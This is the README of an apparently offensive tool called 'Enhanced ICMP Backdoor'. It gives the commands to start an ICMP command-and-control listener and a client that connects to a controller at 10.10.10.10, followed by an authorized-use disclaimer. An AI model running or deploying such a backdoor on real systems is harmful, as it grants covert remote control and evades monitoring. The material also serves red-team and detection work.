<h1> Enhanced ICMP Backdoor </h1>

# Usage

- On server (listener)
<code>sudo python3 icmp_cnc.py -i eth0</code>

- On client
<code>sudo python3 icmp_client.py -i eth0 -d 10.10.10.10</code>

Tested on Kali Linux but should be compatible with almost everything.

Thanks to krabelize for the idea.
The code is "as-is", anything you do with it is your responsibility. Use it only in authorized environments. I take no credit for whatever illegal shit you do with it. Love ♥
